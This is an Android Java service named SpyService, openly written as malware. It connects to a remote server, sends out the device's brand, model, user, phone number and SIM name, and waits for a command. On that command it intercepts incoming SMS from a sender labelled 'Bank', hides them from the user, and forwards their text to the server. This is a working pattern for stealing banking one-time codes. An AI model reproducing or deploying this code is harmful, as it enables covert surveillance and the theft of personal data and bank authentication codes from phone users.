package com.example.malwareapp;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class SpyService extends Service {

    private boolean ONLINE_FLAG = false;
    private final String LOG_TAG = "ServiceLog";
    private final String DST_ADDRESS = "192.168.1.100";
    private final int DST_PORT = 3333;
    private static Socket socket;
    private static Scanner scanner;
    private static BroadcastReceiver messageReceiver;
    private final String START_RECEIVE = "1";

    public SpyService() {
    }

    @Override
    public void onCreate() {
        super.onCreate(); Log.d(LOG_TAG, "ON CREATE");

        ONLINE_FLAG = isOnline();
        Log.i(LOG_TAG, "Is Online? - " + ONLINE_FLAG);
        Log.i(LOG_TAG, "Connect to server - " + isConnectedToServer());
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {
        Log.d(LOG_TAG, "ON START COMMAND");

        Thread firstMessage = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ONLINE_FLAG) {
                        if(socket.isConnected()) {
                            Log.i(LOG_TAG, "Successfully connected");
                            PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
                            printWriter.println("DEVICE INFO: \n" +
                                    "\tBRAND: " + Build.BRAND + "\n" +
                                    "\tMODEL: " + Build.MODEL + "\n" +
                                    "\tUSER: " + Build.USER + "\n" +
                                    "\tIPLocalAddress: " + socket.getLocalAddress() + "\n" +
                                    "\tPHONE NUMBER: " + MainActivity.deviceData[0] + "\n" +
                                    "\tSIM NAME: " + MainActivity.deviceData[1]
                            );
                            printWriter.flush();
                            printWriter.close();
                        }
                    }
                } catch (IOException e) {
                    Log.e(LOG_TAG, e.getMessage());
                }
            }
        });
        firstMessage.start();

        Thread commandReceiver = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ONLINE_FLAG) {
                        if(socket.isConnected()) {
                            scanner = new Scanner(socket.getInputStream());
                            while (true){
                                while(scanner.hasNext()){
                                    if(scanner.nextLine().equals(START_RECEIVE)){
                                        messageReceiver = new BroadcastReceiver() {
                                            @Override
                                            public void onReceive(Context context, Intent intent) {
                                                Log.d(LOG_TAG, "RECEIVE");
                                                Bundle pudsBundle = intent.getExtras();
                                                Object[] pdus = (Object[]) pudsBundle.get("pdus");
                                                SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[0]);
                                                if(messages.getOriginatingAddress().equals("Bank")) {
                                                    abortBroadcast();
                                                    try (PrintWriter printWriter = new PrintWriter(socket.getOutputStream())){
                                                        printWriter.println(messages.getMessageBody());
                                                    } catch (IOException e) {
                                                        Log.e(LOG_TAG, e.getMessage());
                                                    }
                                                }
                                            }
                                        };
                                        IntentFilter filter = new IntentFilter();
                                        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
                                        registerReceiver(messageReceiver, filter);
                                    }else{
                                        unregisterReceiver(messageReceiver);
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(LOG_TAG, e.getMessage());
                }
            }
        });
        commandReceiver.start();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(LOG_TAG, "ON DESTROY");
        unregisterReceiver(messageReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private boolean isConnectedToServer(){
        if(ONLINE_FLAG){
            try {
                socket = new Socket(DST_ADDRESS, DST_PORT);
                return true;
            } catch (IOException e) {
                Log.e(LOG_TAG, e.getMessage());
                return false;
            }
        }
        return false;
    }

    private boolean isOnline() {
        try {
            Process process = Runtime.getRuntime().exec("/system/bin/ping -c 1 8.8.8.8");
            int retStatus = process.waitFor();
            return (retStatus == 0);
        } catch (IOException e) {
            Log.e(LOG_TAG, e.getMessage());
        } catch (InterruptedException e) {
            Log.e(LOG_TAG, e.getMessage());
        }
        return false;
    }
}
